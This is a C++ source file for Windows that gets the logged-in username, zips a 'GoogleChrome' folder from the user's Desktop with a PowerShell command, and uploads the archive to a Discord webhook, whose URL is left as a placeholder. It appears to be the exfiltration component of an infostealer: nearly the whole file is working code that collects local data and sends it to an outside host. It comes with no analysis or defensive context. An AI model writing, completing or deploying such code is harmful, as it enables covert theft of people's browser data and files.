#include "FolderSender.h"
#include <windows.h>
#include <winhttp.h>
#include <fstream>
#include <vector>
#include <lmcons.h>

#pragma comment(lib, "winhttp.lib")

std::wstring username = []() {
    wchar_t name[256];
    DWORD size = 256;

    if (GetUserNameW(name, &size))
        return std::wstring(name);

    return std::wstring(L"UNKNOWN");
    }();

static bool ZipFolder(
    const std::wstring& folderPath,
    const std::wstring& zipPath
)
{
    std::wstring cmd =
        L"powershell -Command \"Compress-Archive -Path '"
        + folderPath +
        L"' -DestinationPath '" +
        zipPath +
        L"' -Force\"";

    return _wsystem(cmd.c_str()) == 0;
}

bool SendFolderToDiscord()
   
    {
    const std::wstring folderPath = L"C:\\Users\\" + username + L"\\Desktop\\GoogleChrome";
    const std::wstring webhookUrl = L"DISCORD=WEBHOOK";
    const std::wstring zipPath = L"C:\\Temp\\GoogleChrome.zip";
    CreateDirectoryW(L"C:\\Temp", nullptr);

    if (!ZipFolder(folderPath, zipPath))
        return false;

    std::ifstream file(zipPath, std::ios::binary);
    if (!file)
        return false;

    std::vector<char> fileData(
        (std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>()
    );

    URL_COMPONENTSW components{};
    components.dwStructSize = sizeof(components);

    wchar_t host[256]{};
    wchar_t path[1024]{};

    components.lpszHostName = host;
    components.dwHostNameLength = _countof(host);
    components.lpszUrlPath = path;
    components.dwUrlPathLength = _countof(path);

    if (!WinHttpCrackUrl(webhookUrl.c_str(), 0, 0, &components))
        return false;

    HINTERNET hSession = WinHttpOpen(
        L"FolderSender",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        host,
        components.nPort,
        0
    );

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        path,
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );

    std::string boundary = "----DiscordBoundary";
    std::string body =
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"GoogleChrome.zip\"\r\n"
        "Content-Type: application/zip\r\n\r\n";

    body.insert(body.end(), fileData.begin(), fileData.end());
    body += "\r\n--" + boundary + "--\r\n";

    std::wstring headers =
        L"Content-Type: multipart/form-data; boundary=" +
        std::wstring(boundary.begin(), boundary.end());

    WinHttpSendRequest(
        hRequest,
        headers.c_str(),
        (DWORD)-1,
        body.data(),
        (DWORD)body.size(),
        (DWORD)body.size(),
        0
    );

    WinHttpReceiveResponse(hRequest, nullptr);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return true;
}
